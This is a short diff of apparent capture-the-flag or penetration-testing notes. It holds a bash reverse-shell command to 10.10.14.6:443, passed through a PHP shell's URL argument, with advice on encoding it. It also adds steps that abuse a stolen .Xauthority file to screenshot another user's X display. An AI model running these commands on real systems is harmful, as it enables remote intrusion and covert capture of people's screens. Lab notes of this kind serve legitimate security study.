@@ -16,3 +16,9 @@ Give user rights id
 php revershell shell in url arg
 > bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
 I’ll need to URL encode the & characters to %26, or else they will be treated as the end of the cmd parameter, with a new parameter following.
+
+Exploit .Xauthority
+> XAUTHORITY=/tmp/.Xauthority xdpyinfo -display :0
+> XAUTHORITY=/tmp/.Xauthority xwininfo -root -tree -display :0
+> XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/0xdf.xwd
+> convert screenshot.xwd screenshot.png
